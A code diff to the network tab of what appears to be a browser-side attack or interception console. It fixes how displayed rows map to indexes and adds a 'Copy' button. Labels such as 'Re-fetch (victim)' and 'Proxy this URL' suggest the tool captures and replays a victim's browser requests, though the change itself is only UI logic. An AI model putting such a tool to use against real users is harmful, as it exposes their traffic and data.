@@ -637,6 +637,7 @@ body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
 var active   = null;
 var hist     = [], hi = -1;
 var netRows  = [], netExp = new Set();
+var netViewRows = [];         // currently displayed rows (filtered, newest first)
 var netFilt  = "", netMeth = "ALL";
 var netStat  = "ALL";      // status filter: ALL / 2 / 3 / 4
 var netPaused = false;     // capture pause
@@ -1000,6 +1001,7 @@ function renderNet(){
       });
     });
   } catch(e) {}
+  netViewRows = rows.slice().reverse();        // display order — copy/detail index base
   nbdg.textContent=rows.length; nbdg.className="bdg"+(rows.length?" show":"");
   // dynamic method buttons — auto-expose observed methods (incl. WS◀/BEACON)
   var meths=["GET","POST"];
@@ -1009,6 +1011,7 @@ function renderNet(){
     return '<button class="mbtn'+(m===netMeth?" on":"")+'" data-m="'+esc(m)+'">'+esc(m)+'</button>';
   }).join("");
   if (!rows.length){
+    netViewRows = [];
     ntbody.innerHTML='<tr id="n-empty"><td colspan="6">No network requests — waiting for fetch/XHR/resources/WS</td></tr>';
     return;
   }
@@ -1017,8 +1020,8 @@ function renderNet(){
     s=s||0;
     return s>=200&&s<300?"sc-ok":s>=300&&s<400?"sc-rd":s===0?"sc-na":"sc-er";
   };
-  ntbody.innerHTML=rows.slice().reverse().map(function(r,i){
-    var ni=rows.length-1-i, exp=netExp.has(ni);
+  ntbody.innerHTML=netViewRows.map(function(r,ni){
+    var exp=netExp.has(ni);
     var mth=(r.method||"GET").toUpperCase();
     var st=r.ro&&!r.status?"·":(r.status||"?");
     return '<tr class="'+(exp?"nsel":"")+ '" data-ni="'+ni+'">'
@@ -1044,6 +1047,7 @@ function renderNet(){
              +'<div class="ndet-hdr">body/status not exposed by resource timing — re-fetch to capture the response</div>'
              +'<button class="ndet-pxbtn" data-rf="'+esc(r.url)+'">🔁 Re-fetch (victim)</button>'
              +'<button class="ndet-pxbtn" data-sf="'+esc(r.url)+'">🌐 Fetch body (server)</button>'
+             +'<button class="ndet-pxbtn" data-cb="'+ni+'">⧉ Copy</button>'
              +'<button class="ndet-pxbtn" data-pu="'+esc(r.url)+'">🔁 Proxy this URL</button>'
             :'<div class="ndet-sec">Response</div>'
              +'<pre>'+esc(prettyBody(r.body||"(empty)", r.ct))+'</pre>'
@@ -1069,8 +1073,11 @@ function renderNet(){
     if (sfb){ fetchBodyServer(sfb.dataset.sf); return; }
     var cpb=e.target.closest("[data-cb]");
     if (cpb){
-      var r0=netRows.slice().reverse()[+cpb.dataset.cb];
-      if (r0) copyText(prettyBody(r0.body||"", r0.ct) || "");
+      var r0=netViewRows[+cpb.dataset.cb];
+      if (r0){
+        copyText(prettyBody(r0.body||"", r0.ct) || "");
+        var o=cpb.textContent; cpb.textContent="✔"; setTimeout(function(){ cpb.textContent=o; }, 900);
+      }
       return;
     }
     var rfb=e.target.closest("[data-rf]");
